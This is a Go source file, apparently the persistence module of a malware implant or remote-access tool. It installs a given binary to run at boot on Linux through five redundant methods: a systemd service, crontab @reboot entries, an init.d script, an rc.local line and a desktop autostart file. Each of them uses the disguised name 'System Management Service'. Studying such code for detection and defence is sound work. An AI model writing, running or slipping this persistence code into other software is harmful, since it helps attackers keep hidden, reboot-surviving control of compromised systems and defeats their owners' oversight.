package persistence

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// InstallLinux, applies all persistence methods for Linux
func InstallLinux(binaryPath, serviceName string) error {
	var successCount int

	// Try all techniques
	if err := InstallLinuxSystemd(binaryPath, serviceName); err == nil {
		successCount++
	}

	if err := InstallLinuxCron(binaryPath); err == nil {
		successCount++
	}

	if err := InstallLinuxInitd(binaryPath, serviceName); err == nil {
		successCount++
	}

	if err := InstallLinuxRcLocal(binaryPath); err == nil {
		successCount++
	}

	if err := InstallLinuxAutostart(binaryPath, serviceName); err == nil {
		successCount++
	}

	if successCount > 0 {
		return nil
	}

	return fmt.Errorf("no Linux persistence method was successful")
}

// InstallLinuxSystemd, creates a Linux systemd service
func InstallLinuxSystemd(binaryPath, serviceName string) error {
	// Systemd service content
	serviceContent := fmt.Sprintf(`[Unit]
Description=System Management Service
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always

[Install]
WantedBy=multi-user.target
`, binaryPath)

	// Create service file
	servicePath := "/etc/systemd/system/" + serviceName + ".service"
	if err := os.WriteFile(servicePath, []byte(serviceContent), 0644); err != nil {
		return err
	}

	// Enable and start service
	exec.Command("systemctl", "daemon-reload").Run()
	exec.Command("systemctl", "enable", serviceName).Run()
	exec.Command("systemctl", "start", serviceName).Run()

	fmt.Println("Systemd service created")
	return nil
}

// InstallLinuxCron, adds a cron job to Linux
func InstallLinuxCron(binaryPath string) error {
	// Cron job content
	cronJob := fmt.Sprintf("@reboot root %s\n", binaryPath)

	// Add to cron file
	cronPath := "/etc/crontab"
	if err := appendToFile(cronPath, cronJob); err != nil {
		// Alternative: User crontab
		cronFile, err := os.CreateTemp("", "cron")
		if err != nil {
			return err
		}
		defer os.Remove(cronFile.Name())

		// Get current crontab
		cmd := exec.Command("crontab", "-l")
		output, _ := cmd.Output()

		// New crontab content
		newCron := string(output)
		if !strings.Contains(newCron, binaryPath) {
			newCron += fmt.Sprintf("\n@reboot %s\n", binaryPath)

			// Write to temporary file
			if err := os.WriteFile(cronFile.Name(), []byte(newCron), 0644); err != nil {
				return err
			}

			// Update crontab
			installCmd := exec.Command("crontab", cronFile.Name())
			if err := installCmd.Run(); err != nil {
				return err
			}
		}
	}

	fmt.Println("Cron job added")
	return nil
}

// InstallLinuxInitd, adds a Linux init.d script
func InstallLinuxInitd(binaryPath, serviceName string) error {
	// Init.d script content
	initScript := fmt.Sprintf(`#!/bin/sh
### BEGIN INIT INFO
# Provides:          %s
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System Management Service
### END INIT INFO

DAEMON="%s"

case "$1" in
  start)
    echo "Starting system management service"
    $DAEMON &
    ;;
  stop)
    echo "Stopping system management service"
    pkill -f "$DAEMON"
    ;;
  restart)
    $0 stop
    $0 start
    ;;
  *)
    echo "Usage: $0 {start|stop|restart}"
    exit 1
    ;;
esac

exit 0
`, serviceName, binaryPath)

	// Create init.d script file
	initPath := "/etc/init.d/" + serviceName
	if err := os.WriteFile(initPath, []byte(initScript), 0755); err != nil {
		return err
	}

	// Enable script
	exec.Command("update-rc.d", serviceName, "defaults").Run()

	fmt.Println("Init.d script added")
	return nil
}

// InstallLinuxRcLocal adds command to Linux /etc/rc.local file
func InstallLinuxRcLocal(binaryPath string) error {
	// Check rc.local file
	rcLocalPath := "/etc/rc.local"
	if !fileExists(rcLocalPath) {
		// If rc.local file does not exist, create it
		rcLocalContent := `#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.

exit 0
`
		if err := os.WriteFile(rcLocalPath, []byte(rcLocalContent), 0755); err != nil {
			return err
		}
	}

	// Read file content
	content, err := os.ReadFile(rcLocalPath)
	if err != nil {
		return err
	}

	// Add command (before exit 0)
	strContent := string(content)
	if !strings.Contains(strContent, binaryPath) {
		strContent = strings.Replace(strContent, "exit 0", fmt.Sprintf("%s &\nexit 0", binaryPath), 1)
		if err := os.WriteFile(rcLocalPath, []byte(strContent), 0755); err != nil {
			return err
		}
	}

	fmt.Println("Command added to rc.local file")
	return nil
}

// InstallLinuxAutostart, creates a Linux desktop autostart file
func InstallLinuxAutostart(binaryPath, appName string) error {
	// Create autostart directory
	autostartDir := filepath.Join(os.Getenv("HOME"), ".config/autostart")
	if err := os.MkdirAll(autostartDir, 0755); err != nil {
		return err
	}

	// Desktop file content
	desktopFile := fmt.Sprintf(`[Desktop Entry]
Type=Application
Name=System Management
Exec=%s
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
`, binaryPath)

	// Create desktop file
	desktopPath := filepath.Join(autostartDir, "system-management.desktop")
	if err := os.WriteFile(desktopPath, []byte(desktopFile), 0644); err != nil {
		return err
	}

	fmt.Println("Desktop autostart file created")
	return nil
}
